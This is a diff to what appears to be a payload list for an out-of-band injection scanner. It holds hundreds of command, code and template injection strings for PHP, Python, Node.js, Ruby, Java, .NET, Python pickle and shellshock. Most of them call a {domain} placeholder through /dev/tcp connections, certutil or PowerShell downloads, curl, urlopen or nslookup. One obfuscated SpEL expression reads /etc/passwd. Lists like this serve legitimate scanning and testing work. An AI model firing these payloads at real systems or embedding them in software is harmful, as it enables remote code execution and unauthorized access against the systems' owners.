@@ -357,79 +357,182 @@ ${{<%[%'\"}}%\\
 --version
 -h
 --help
++++ATH0
 $USER
-\/dev\/null; ping {domain} ; echo
-`ping {domain}`
+--use-compress-program=nslookup {domain} -domain=a.jpg
 $(ping {domain})
-#{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
-#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
-$_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']
-$_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']
-$_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"]
-$_GET['exec 6< \/dev\/tcp\/{domain}\/80']
-$_GET['ping {domain}']
-$_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']
-$_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']
-$_GET['sleep 9']
-${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
-${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
-($_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']);
-($_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']);
-($_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"']);
-($_GET['exec 6< \/dev\/tcp\/{domain}\/80']);
-($_GET['ping {domain}']);
-($_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']);
-($_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']);
-($_GET['sleep 9']);
 () { 0; }; ping {domain};
 () { _; } >_[$($())] { ping {domain}; }
---use-compress-program=nslookup {domain} -domain=a.jpg
-:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('ping {domain}').toString()\")()
-;Kernel.exit(1);
-;escapeshellcmd('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;escapeshellcmd('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;escapeshellcmd('certutil -urlcache -f \"http:\/\/{domain}\"');
-;escapeshellcmd('exec 6< \/dev\/tcp\/{domain}\/80');
-;escapeshellcmd('ping {domain} -c 2');
-;escapeshellcmd('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;escapeshellcmd('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;escapeshellcmd('sleep 9');
-;exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;exec('certutil -urlcache -f \"http:\/\/{domain}\"');
-;exec('exec 6< \/dev\/tcp\/{domain}\/80');
-;exec('ping {domain} -c 2');
-;exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;exec('sleep 9');
-;exit(1);
-;phpinfo();
-;shell_exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;shell_exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;shell_exec('certutil -urlcache -f \"http:\/\/{domain}\"');
-;shell_exec('exec 6< \/dev\/tcp\/{domain}\/80');
-;shell_exec('ping {domain} -c 2');
-;shell_exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;shell_exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;shell_exec('sleep 9');
-;system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;system('certutil -urlcache -f \"http:\/\/{domain}\"');
-;system('exec 6< \/dev\/tcp\/{domain}\/80');
-;system('ping {domain} -c 2');
-;system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;system('sleep 9');
-<?php system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'); ?>
-<?php system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'); ?>
-<?php system('certutil -urlcache -f \"http:\/\/{domain}\"'); ?>
-<?php system('exec 6< \/dev\/tcp\/{domain}\/80'); ?>
-<?php system('ping {domain}'); ?>
-<?php system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")'); ?>
-<?php system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"'); ?>
-<?php system('sleep 9'); ?>
+\/dev\/null; ping {domain} ; echo
 @{[system \"ping {domain}\"]}
-Kernel.exit(1)
+__import__(\"time\").sleep(9)
+__import__(\"urllib.request\").request.urlopen(\"http:\/\/{domain}\")
+__import__(\"urllib.request\").request.urlopen(\"https:\/\/{domain}\")
+__import__(\"subprocess\").getoutput(\"\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80 \\\"\")
+__import__(\"subprocess\").getoutput(\"certutil -urlcache -f 'http:\/\/{domain}'\"\")
+__import__(\"os\").system(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+__import__(\"os\").system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+__import__(\"os\").system(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+__import__(\"os\").system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+__import__(\"os\").system(\"ping {domain} -c 2\")
+__import__(\"os\").system(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+__import__(\"os\").system(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+eval(\"__import__(\\\"time\\\").sleep(9)\")
+eval(\"__import__(\\\"urllib.request\\\").request.urlopen(\\\"http:\/\/{domain}\\\")\")
+eval(\"__import__(\\\"urllib.request\\\").request.urlopen(\\\"https:\/\/{domain}\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"\/bin\/bash -c \\\\\"true > \/dev\/tcp\/{domain}\/80 \\\\\"\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\"\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"ping {domain} -c 2\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\")\")
+require('child_process').execSync(`sleep 9`).toString();
+require('child_process').execSync(`timeout 9`).toString();
+http.get('http:\/\/{domain}')
+https.get('https:\/\/{domain}')
+require('http').get('http:\/\/{domain}')
+require('https').get('https:\/\/{domain}')
+require('child_process').execSync(`\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'`).toString();
+require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();
+require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString();
+require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();
+require('child_process').execSync(`ping {domain} -c 2`).toString();
+require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString();
+require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString();
+eval(require('child_process').execSync(`sleep 9`).toString();)
+eval(require('child_process').execSync(`timeout 9`).toString();)
+eval(http.get('http:\/\/{domain}'))
+eval(https.get('https:\/\/{domain}'))
+eval(require('http').get('http:\/\/{domain}'))
+eval(require('https').get('https:\/\/{domain}'))
+eval(require('child_process').execSync(`\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'`).toString();)
+eval(require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();)
+eval(require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString();)
+eval(require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();)
+eval(require('child_process').execSync(`ping {domain} -c 2`).toString();)
+eval(require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString();)
+eval(require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString();)
+sleep(9)
+file_get_contents(\"http:\/\/{domain}\")
+curl_exec(curl_init(\"https:\/\/{domain}\"))
+exec(\"sleep 9\")
+exec(\"timeout 9\")
+exec(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"ping {domain} -c 2\")
+exec(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+exec(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+shell_exec(\"sleep 9\")
+shell_exec(\"timeout 9\")
+shell_exec(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+shell_exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+shell_exec(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+shell_exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+shell_exec(\"ping {domain} -c 2\")
+shell_exec(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+shell_exec(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+eval(\"echo sleep(9);\");
+eval(\"echo file_get_contents(\\\"http:\/\/{domain}\\\");\");
+eval(\"echo curl_exec(curl_init(\\\"https:\/\/{domain}\\\"));\");
+eval(\"echo exec(\\\"sleep 9\\\");\");
+eval(\"echo exec(\\\"timeout 9\\\");\");
+eval(\"echo exec(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\");\");
+eval(\"echo exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo exec(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo exec(\\\"ping {domain} -c 2\\\");\");
+eval(\"echo exec(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\");\");
+eval(\"echo exec(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo shell_exec(\\\"sleep 9\\\");\");
+eval(\"echo shell_exec(\\\"timeout 9\\\");\");
+eval(\"echo shell_exec(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\");\");
+eval(\"echo shell_exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo shell_exec(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo shell_exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo shell_exec(\\\"ping {domain} -c 2\\\");\");
+eval(\"echo shell_exec(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\");\");
+eval(\"echo shell_exec(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\");\");
+sleep(9)
+require 'net\/http'; puts Net::HTTP.get(URI('http:\/\/{domain}'))
+require 'net\/http'; puts Net::HTTP.get(URI('https:\/\/{domain}'))
+`sleep 9`
+`timeout 9`
+`\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'`
+`exec 6< \/dev\/tcp\/{domain}\/80`
+`certutil -urlcache -f 'http:\/\/{domain}'`
+`exec 6< \/dev\/tcp\/{domain}\/80`
+`ping {domain} -c 2`
+`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`
+`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`
+exec(\"sleep 9\")
+exec(\"timeout 9\")
+exec(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"ping {domain} -c 2\")
+exec(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+exec(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+system(\"sleep 9\")
+system(\"timeout 9\")
+system(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+system(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+system(\"ping {domain} -c 2\")
+system(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+system(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+eval(\"sleep(9)\")
+eval(\"require \\'net\/http\\'; puts Net::HTTP.get(URI(\\'http:\/\/{domain}\\'))\")
+eval(\"require \\'net\/http\\'; puts Net::HTTP.get(URI(\\'https:\/\/{domain}\\'))\")
+eval(\"`sleep 9`\")
+eval(\"`timeout 9`\")
+eval(\"`\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'`\")
+eval(\"`exec 6< \/dev\/tcp\/{domain}\/80`\")
+eval(\"`certutil -urlcache -f \\'http:\/\/{domain}\\'`\")
+eval(\"`exec 6< \/dev\/tcp\/{domain}\/80`\")
+eval(\"`ping {domain} -c 2`\")
+eval(\"`powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')`\")
+eval(\"`powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'`\")
+eval(\"exec(\\\"sleep 9\\\")\")
+eval(\"exec(\\\"timeout 9\\\")\")
+eval(\"exec(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\")\")
+eval(\"exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"exec(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\")\")
+eval(\"exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"exec(\\\"ping {domain} -c 2\\\")\")
+eval(\"exec(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\")\")
+eval(\"exec(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\")\")
+eval(\"system(\\\"sleep 9\\\")\")
+eval(\"system(\\\"timeout 9\\\")\")
+eval(\"system(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\")\")
+eval(\"system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"system(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\")\")
+eval(\"system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"system(\\\"ping {domain} -c 2\\\")\")
+eval(\"system(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\")\")
+eval(\"system(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\")\")
+cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
+cos%0Asystem%0A(S%27hostname%27%0AtR.%0A
+cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
+cos%0Asystem%0A(S%27ping%20-c%205%20{domain}%27%0AtR.%0A
+new System.Diagnostics.ProcessStartInfo(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\");
+new System.Diagnostics.ProcessStartInfo(\"\/bin\/sh -c 'true > \/dev\/tcp\/{domain}\/80'\");
+new System.Diagnostics.ProcessStartInfo(\"certutil -urlcache -f 'http:\/\/{domain}'\");
+new System.Diagnostics.ProcessStartInfo(\"exec 6< \/dev\/tcp\/{domain}\/80\");
+new System.Diagnostics.ProcessStartInfo(\"ping {domain}\");
+new System.Diagnostics.ProcessStartInfo(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\");
+new System.Diagnostics.ProcessStartInfo(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\");
+:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('ping {domain}').toString()\")()
+#{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
+#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
+${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
+${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
 Runtime.getRuntime().exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
 Runtime.getRuntime().exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
 Runtime.getRuntime().exec('certutil -urlcache -f \"http:\/\/{domain}\"');
@@ -447,62 +550,6 @@ T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")').getInputStream())
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"').getInputStream())
 T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())
-__import__(\u2018os\u2019).system('sleep 9')
-__import__(\u2018os\u2019).system(\u2018\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"\u2019)
-__import__(\u2018os\u2019).system(\u2018\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"\u2019)
-__import__(\u2018os\u2019).system(\u2018certutil -urlcache -f 'http:\/\/{domain}'\u2019)
-__import__(\u2018os\u2019).system(\u2018exec 6< \/dev\/tcp\/{domain}\/80\u2019)
-__import__(\u2018os\u2019).system(\u2018ping {domain} -c 2\u2019)
-__import__(\u2018os\u2019).system(\u2018powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\u2019)
-__import__(\u2018os\u2019).system(\u2018powershell -c Invoke-WebRequest 'http:\/\/{domain}'\u2019)
-`printenv \/`
-child_process.exec(`\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.exec(`\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.exec(`certutil -urlcache -f 'http:\/\/{domain}'`);
-child_process.exec(`exec 6< \/dev\/tcp\/{domain}\/80`);
-child_process.exec(`ping {domain} -c 2`);
-child_process.exec(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`);
-child_process.exec(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`);
-child_process.exec(`sleep 9`);
-child_process.execSync(`\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.execSync(`\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"`);
-child_process.execSync(`certutil -urlcache -f 'http:\/\/{domain}'`);
-child_process.execSync(`exec 6< \/dev\/tcp\/{domain}\/80`);
-child_process.execSync(`ping {domain} -c 2`);
-child_process.execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`);
-child_process.execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`);
-child_process.execSync(`sleep 9`);
-require('child_process').execSync(`\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"`).toString());
-require('child_process').execSync(`\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"`).toString());
-require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString());
-require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString());
-require('child_process').execSync(`ping {domain} -c 2`).toString());
-require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString());
-require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString());
-require('child_process').execSync(`sleep 9`).toString());
-cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
-cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
-cos%0Asystem%0A(S%27ping%20-c%205%20{domain}%27%0AtR.%0A
-escapeshellcmd('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-escapeshellcmd('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-escapeshellcmd('certutil -urlcache -f \"http:\/\/{domain}\"')
-escapeshellcmd('exec 6< \/dev\/tcp\/{domain}\/80')
-escapeshellcmd('ping {domain} -c 2')
-escapeshellcmd('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-escapeshellcmd('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-escapeshellcmd('sleep 9')
-eval(1337*1337)
-eval(7*7)
-eval(compile('for x in range(1):\\n import time\\n time.sleep(20)','a','single'))
-exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-exec('certutil -urlcache -f \"http:\/\/{domain}\"')
-exec('exec 6< \/dev\/tcp\/{domain}\/80')
-exec('ping {domain} -c 2')
-exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-exec('sleep 9')
-exit(1)
 java.lang.Runtime.exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\");
 java.lang.Runtime.exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\");
 java.lang.Runtime.exec('certutil -urlcache -f \"http:\/\/{domain}\"');
@@ -510,57 +557,7 @@ java.lang.Runtime.exec('exec 6< \/dev\/tcp\/{domain}\/80);
 java.lang.Runtime.exec('ping {domain} -c 2);
 java.lang.Runtime.exec('powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}'));
 java.lang.Runtime.exec('powershell -c Invoke-WebRequest 'http:\/\/{domain}');
-java.lang.Runtime.exec('sleep');
-new System.Diagnostics.ProcessStartInfo(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\");
-new System.Diagnostics.ProcessStartInfo(\"\/bin\/sh -c 'true > \/dev\/tcp\/{domain}\/80'\");
-new System.Diagnostics.ProcessStartInfo(\"certutil -urlcache -f 'http:\/\/{domain}'\");
-new System.Diagnostics.ProcessStartInfo(\"exec 6< \/dev\/tcp\/{domain}\/80\");
-new System.Diagnostics.ProcessStartInfo(\"ping {domain}\");
-new System.Diagnostics.ProcessStartInfo(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\");
-new System.Diagnostics.ProcessStartInfo(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\");
-new System.Diagnostics.ProcessStartInfo(\"timeout 9\");
-os.system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-os.system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-os.system('certutil -urlcache -f \"http:\/\/{domain}\"')
-os.system('exec 6< \/dev\/tcp\/{domain}\/80')
-os.system('ping {domain} -c 2')
-os.system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-os.system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-os.system('sleep 9')
-phpinfo()
-root.process.mainModule.require('child_process').spawnSync('ping', ['{domain}']).stdout
-shell_exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-shell_exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-shell_exec('certutil -urlcache -f \"http:\/\/{domain}\"')
-shell_exec('exec 6< \/dev\/tcp\/{domain}\/80')
-shell_exec('ping {domain} -c 2')
-shell_exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-shell_exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-shell_exec('sleep 9')
-subprocess.Popen('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.Popen('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.Popen('certutil -urlcache -f \"http:\/\/{domain}\", shell=True)
-subprocess.Popen('exec 6< \/dev\/tcp\/{domain}\/80', shell=True)
-subprocess.Popen('ping {domain} -c 2', shell=True)
-subprocess.Popen('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")', shell=True)
-subprocess.Popen('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"', shell=True)
-subprocess.Popen('sleep 9', shell=True)
-subprocess.check_output('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.check_output('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"', shell=True)
-subprocess.check_output('certutil -urlcache -f \"http:\/\/{domain}\", shell=True)
-subprocess.check_output('exec 6< \/dev\/tcp\/{domain}\/80', shell=True)
-subprocess.check_output('ping {domain} -c 2', shell=True)
-subprocess.check_output('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")', shell=True)
-subprocess.check_output('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"', shell=True)
-subprocess.check_output('sleep 9', shell=True)
-system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"')
-system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"')
-system('certutil -urlcache -f \"http:\/\/{domain}\"')
-system('exec 6< \/dev\/tcp\/{domain}\/80')
-system('ping {domain} -c 2')
-system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")')
-system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"')
-system('sleep 9')
+java.lang.Runtime.exec('sleep 9');
 }#{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}#{
 }#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}#{
 }${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}${
